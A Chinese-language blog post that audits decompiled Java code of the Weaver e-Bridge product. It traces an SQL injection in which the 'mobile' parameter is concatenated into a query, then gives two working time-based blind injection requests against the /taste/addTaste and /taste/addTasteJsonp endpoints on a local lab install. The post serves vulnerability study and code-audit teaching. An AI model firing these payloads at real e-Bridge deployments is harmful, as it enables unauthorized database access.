#  泛微云桥e-Bridge SQL注入漏洞分析   
原创 莫大130  安全逐梦人   2024-12-15 14:37  
  
   
> 12月到了，今天带来泛微云桥e-Bridge SQL注入漏洞分析，从环境搭建到漏洞利用一系列操作，技术含量不高，当学习一下java代码审计  
  
## 环境搭建  
```
https://wxdownload.e-cology.com.cn/ebridge/ebridge_install_win64_server2008R2_20200819.zip
```  
  
下载Windows版本的泛微云桥e-Bridge，解压后目录结构  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/vOGOib9z4Wz6IHoMXG22T0mmeaa8amWlmols7kuqXrnsicF9upRnG1DianJHsShfX1ZDBSFicgdnBib7KnATDXQ3sfQ/640?wx_fmt=png "null")  
  
  
第一次运行后需要打补丁  
```
https://wxdownload.e-cology.com.cn/ebridge/ebridge_patch_20230724.zip 
```  
  
解压文件，得到一个“ROOT”文件夹，直接覆盖到自己泛微云桥目录即可  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/vOGOib9z4Wz6IHoMXG22T0mmeaa8amWlmg67jKEfxx66fes5fQcL1SrJMibOzvR2OZMgL4a6INZib4U07n05xBTWw/640?wx_fmt=png "null")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/vOGOib9z4Wz6IHoMXG22T0mmeaa8amWlmvbtaAOv4kXmWJCsuiaRbcfePYlBoDibTRHl8NqCHB1l94ibglf6PG6V7Q/640?wx_fmt=png "null")  
  
  
具体启动参考泛微云桥windows版安装说明.txt   
，当前版本：20230724SP2  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/vOGOib9z4Wz6IHoMXG22T0mmeaa8amWlmJExqHbZVPT7GaMofJh2OIl2gBjCMEX8kxEJ7frazTGEnas95RVMJHQ/640?wx_fmt=png "null")  
  
## 配置调试环境  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/vOGOib9z4Wz6IHoMXG22T0mmeaa8amWlmVGSpqROFUurB7eTLqEKiaQicrQGekOxDH7h69PuDmUFOy0icTdTRm5xpw/640?wx_fmt=png "null")  
  
  
找到 tomcat/bin/startup.bat 首行写入如下  
```
SET CATALINA_OPTS=-server -Xdebug -Xnoagent -Djava.compiler=NONE -Xrunjdwp:transport=dt_socket,server=y,suspend=n,address=5005
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/vOGOib9z4Wz6IHoMXG22T0mmeaa8amWlmpIUvs7XBKibjOSXf9C8KL0jh1nic87tNKnlRNfSuzSLh7VicbF0JIaYGw/640?wx_fmt=png "null")  
  
## IDEA 配置远程调试  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/vOGOib9z4Wz6IHoMXG22T0mmeaa8amWlmbdqlJOK4opEeFG5Ty5CHJoFpWRpHGBS9Eupyicchz2NBVJ0nOItpbNQ/640?wx_fmt=png "null")  
  
## addTaste 注入  
  
漏洞文件路径：ebridge\tomcat\webapps\ROOT\WEB-INF\classes\weaver\weixin\taste\controller\TasteController.class  
```
   @ClearInterceptor   public void addTaste() {      String company = Util.null2String(this.getPara("company"));      String userName = Util.null2String(this.getPara("userName"));      String mobile = Util.null2String(this.getPara("mobile"));      String openid = Util.null2String(this.getPara("openid"));      String from = Util.null2String(this.getPara("from"), "0");      String source = Util.null2String(this.getPara("source"));      int status = 1;      String msg = this.saveTaste(company, userName + "(客户)", mobile, from, openid, source);      if (msg.equals("")) {         status = 0;      }      this.setAttr("status", Integer.valueOf(status));      this.setAttr("msg", msg);      this.renderJson();   }
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/vOGOib9z4Wz6IHoMXG22T0mmeaa8amWlmics6Ol0L6l1ogbibcdoQgvCkicbN9ZOq9R38VqCeibEmicm78tO4YAje4QA/640?wx_fmt=png "null")  
  
  
addTaste  
 函数很明显，接收get传入的值，带入到 saveTaste  
 函数查询  
### saveTaste  
```
   public String saveTaste(String company, String userName, String mobile, String from, String openid, String source) {      String msg = "";      byte status = 1;      try {         if (!"".equals(company) && !"".equals(userName) && !"".equals(mobile)) {            String wxuserid = mobile;            Prop prop = PropKit.use("taste.properties");            String syscorpid = prop.get("syscorpid");            String outsysid = prop.get("outsysid");            String ecurl = prop.get("ecurl");            int departid = prop.getInt("departid");            String ewDepartid = prop.get("ewDepartid");            Record record = Db.findById("wx_outsys_sysinfo", outsysid);            if (record != null) {               ecurl = record.getStr("access_url");               String ecuserid = "";               String province;               try {                  Map queryParas = new HashMap();                  queryParas.put("userName", userName);                  queryParas.put("mobile", mobile);                  queryParas.put("company", company);                  queryParas.put("secret", "12345");                  province = HttpKit.post(ecurl + "/mypage/createUser.jsp", queryParas, "");                  JSONObject json = JSONObject.fromObject(province);                  if (json != null) {                     if (json.getInt("status") == 0) {                        ecuserid = json.getString("userid");                     } else {                        msg = "在Ecology系统创建体验账号出错:" + json.getString("msg");                     }                  } else {                     msg = "访问ECOLOGY系统出错";                  }               } catch (Exception var41) {                  var41.printStackTrace();                  msg = "在Ecology系统创建体验账号出错:" + var41.getMessage();               }               int code = 0;               if (msg.equals("")) {                  try {                     WxCpUser wxCpUser = new WxCpUser();                     wxCpUser.setUserId(wxuserid);                     wxCpUser.setName(userName);                     wxCpUser.setEmail("");                     wxCpUser.setMobile(mobile);                     wxCpUser.setPosition(company);                     wxCpUser.setWeiXinId("");                     wxCpUser.setDepartIds(new Integer[]{departid});                     CallWxCpApi.userCreate(syscorpid, wxCpUser);                  } catch (WxRuntimeException var43) {                     code = var43.getRunTimeMsg().getErrorCode();                     if (var43.getRunTimeMsg().getErrorCode() != 60102 && var43.getRunTimeMsg().getErrorCode() != 60104) {                        msg = "在微信中创建体验账号出错:" + var43.getRunTimeMsg().getErrorMsg();                     }                  } catch (Exception var44) {                     msg = "在微信中创建体验账号出错:" + var44.getMessage();                  }               }               if (msg.equals("") && code != 60104) {                  try {                     List uList = this.wxCpUserModel.getList(WxCpUserBean.class, "select * from wx_cp_userinfo where wxuserid = '" + wxuserid + "' and outsysid = '" + outsysid + "'");                     if (uList == null || uList.size() <= 0) {                        WxCpUserBean cpUser = new WxCpUserBean();                        cpUser.setCreatetime(new Date());                        cpUser.setCreatorid("");                        cpUser.setEmail("");                        cpUser.setImgurl("");                        cpUser.setIsattend(0);                        cpUser.setIssync(1);                        cpUser.setMobile(mobile);                        cpUser.setName(userName);                        cpUser.setOutsysid(outsysid);                        cpUser.setOutuserid(ecuserid);                        cpUser.setPost(company);                        cpUser.setSex(1);                        cpUser.setShoworder(1.0D);                        cpUser.setSyscorpid(syscorpid);                        cpUser.setTenantid("");                        cpUser.setUpdaterid("");                        cpUser.setUpdatetime(new Date());                        cpUser.setWeixin("");                        cpUser.setWxstatus(1);                        cpUser.setWxuserid(wxuserid);                        boolean saveFlag = this.wxCpUserModel.saveBean(cpUser);                        if (saveFlag) {                           this.wxCpUserModel.saveUserDeptRelate(cpUser.getId(), ewDepartid);                        } else {                           msg = "在本地保存体验账号失败";                        }                     }                  } catch (Exception var42) {                     msg = "在本地保存体验账号出错:" + var42.getMessage();                  }               }               if (msg.equals("")) {                  try {                     CallWxCpApi.inviteSend(syscorpid, wxuserid, userName + ":欢迎关注泛微企业号");                  } catch (Exception var40) {                  }               }               if (msg.equals("")) {                  status = 0;               }               if (!"1".equals(from) && !"2".equals(from) && msg.equals("")) {                  msg = "发起远程请求失败";                  status = 2;                  try {                     province = "";                     String city = "";                     String cityValue;                     try {                        Map queryParas = new HashMap();                        queryParas.put("phonenum", mobile);                        String pc = HttpKit.post("http://e8demo.weaver.com.cn/login/getCity.jsp", queryParas, "");                        if (pc != null && !"".equals(pc)) {                           pc = pc.trim();                           pc = pc.substring(1, pc.length() - 1);                           JSONObject json = JSONObject.fromObject(pc);                           if (json != null) {                              cityValue = Util.null2String(json.getString("city"));                              if (cityValue.indexOf("-") >= 0) {                                 String[] pcarr = cityValue.split("-");                                 province = pcarr[0];                                 city = pcarr[1];                              }                           }                        }                     } catch (Exception var38) {                     }                     PostMethod postMethod = new PostMethod("http://www.weaver.com.cn/subpage/apply/applysubmite4json.asp");                     NameValuePair[] param = new NameValuePair[]{new NameValuePair("name", userName.replace("(客户)", "")), new NameValuePair("mobile", mobile), new NameValuePair("company", company), new NameValuePair("type", "12"), new NameValuePair("_url", "http://wx.weaver.com.cn"), new NameValuePair("province", province), new NameValuePair("city", city), new NameValuePair("source", source)};                     postMethod.setRequestBody(param);                     postMethod.getParams().setParameter("http.protocol.content-charset", "GBK");                     HttpClient http = new HttpClient();                     http.getHttpConnectionManager().getParams().setConnectionTimeout(3000);                     http.getHttpConnectionManager().getParams().setSoTimeout(8000);                     http.executeMethod(postMethod);                     cityValue = postMethod.getResponseBodyAsString();                     JSONObject json = JSONObject.fromObject(cityValue);                     if (json != null && "1".equals(json.getString("result"))) {                        msg = "";                        status = 0;                     }                  } catch (Exception var39) {                     msg = "写入客户库失败：" + var39.getMessage();                     var39.printStackTrace();                  }               }            } else {               msg = "没有根据系统ID查询到相关数据";            }         } else {            msg = "相关参数不完整";         }      } catch (Exception var45) {         var45.printStackTrace();         msg = "添加体验账号程序异常，请联系管理员";      } finally {         WxDemoTaste t = new WxDemoTaste();         t.setCompany(company);         t.setCreatetime(new Date());         t.setErrormsg(msg);         t.setIpaddress(ToolWeb.getIpAddr(this.getRequest()));         t.setMobile(mobile);         t.setUsername(userName);         t.setTastefrom(from);         t.setOpenid(openid);         List tList = this.wxDemoTasteModel.getList(WxDemoTaste.class, "select * from wx_demo_taste where mobile ='" + mobile + "'");         if (tList != null && tList.size() > 0) {            t.setIsrepart(1);         } else {            t.setIsrepart(0);         }         t.setStatus(status);         this.wxDemoTasteModel.saveBean(t);      }      return msg;   }
```  
  
在343  
行代码中，sql语句中直接拼接了 mobile 字符串的值，导致漏洞产生。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/vOGOib9z4Wz6IHoMXG22T0mmeaa8amWlmsmLRn9AJudc3PPuSx7lS6IsiawdyuYDXFQnyA6tuJabGelicOumvByhw/640?wx_fmt=png "null")  
  
### 路由分析  
  
在 TasteController.class  
 定义了Controller  
```
@Controller(   controllerKey = {"/taste"})
```  
- • **@Controller**  
: 这个注解用于定义一个控制器，目的是将进入的 HTTP 请求路由到类中的方法。  
  
- • **controllerKey**  
: 这是一个属性，允许你指定该控制器映射的 URL 路径。在你的例子中，它将映射到路径 /taste  
。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/vOGOib9z4Wz6IHoMXG22T0mmeaa8amWlmYtzg3plwIu5mEW0ys7wicVFy5zibjOfw86MvzmNtZAN3eokc6cz9Lu9w/640?wx_fmt=png "null")  
  
  
所以访问 addTaste  
 函数的路由为：  
```
/taste/addTaste?company=1&userName=1&mobile=1&openid=1&from=0&source=1
```  
### 漏洞复现  
```
GET /taste/addTaste?company=1&userName=1&openid=1&source=1&mobile=1%27+AND+%28SELECT+8094+FROM+%28SELECT%28SLEEP%289-%28IF%2818015%3E3469%2C0%2C4%29%29%29%29%29mKjk%29+OR+%27KQZm%27%3D%27REcX HTTP/1.1Host: 127.0.0.1:8088
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/vOGOib9z4Wz6IHoMXG22T0mmeaa8amWlmByjpproxgicMy0RmU8Xj2S427jZWE28WlXjBercfAYs41G1RibL9eLfw/640?wx_fmt=png "null")  
  
## addTasteJsonp 注入  
  
使用jar-analyzer  
工具搜索该方法被调用的地方  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/vOGOib9z4Wz6IHoMXG22T0mmeaa8amWlmUPMtT41ruI8v1GTR6UmHpMY3pVlbQbjbgrV5Dz56fjAibsAgw4rUdOQ/640?wx_fmt=png "null")  
  
  
发现 addTasteJsonp  
 函数一样调用了 saveTaste  
 漏洞点都是一样的  
```
   @ClearInterceptor   public void addTasteJsonp() {      String company = Util.null2String(this.getPara("company"));      String userName = Util.null2String(this.getPara("userName"));      String mobile = Util.null2String(this.getPara("mobile"));      String jsonp = Util.null2String(this.getPara("jsonpcallback"));      String from = Util.null2String(this.getPara("from"), "1");      int status = 1;      String msg = this.saveTaste(company, userName + "(客户)", mobile, from, "", "");      if (msg.equals("")) {         status = 0;      }      this.renderText(jsonp + "({status:" + status + "})");   }
```  
  
在 saveTaste  
 函数343  
行代码中，sql语句中直接拼接了 mobile 字符串的值，导致漏洞产生。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/vOGOib9z4Wz6IHoMXG22T0mmeaa8amWlmsmLRn9AJudc3PPuSx7lS6IsiawdyuYDXFQnyA6tuJabGelicOumvByhw/640?wx_fmt=png "null")  
  
### 漏洞复现  
```
GET /taste/addTasteJsonp?company=1&userName=1&jsonpcallback=1&mobile=1%27%20AND%20(SELECT%208094%20FROM%20(SELECT(SLEEP(3)))mKjk)%20OR%20%27KQZm%27=%27REcX HTTP/1.1Host: 127.0.0.1:8088
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/vOGOib9z4Wz6IHoMXG22T0mmeaa8amWlmquiapYDHPjBL4AjzjWLD1GDlpgWxuNyjS3f69Dw0oibSTn8CbkWUeO2g/640?wx_fmt=png "null")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/vOGOib9z4Wz6IHoMXG22T0mmeaa8amWlmEQdiccNPgPy92Q1QA2m0U0HJBoKXx835XUL3ll45hpZ2WBkl5gCXfkw/640?wx_fmt=png "null")  
  
  
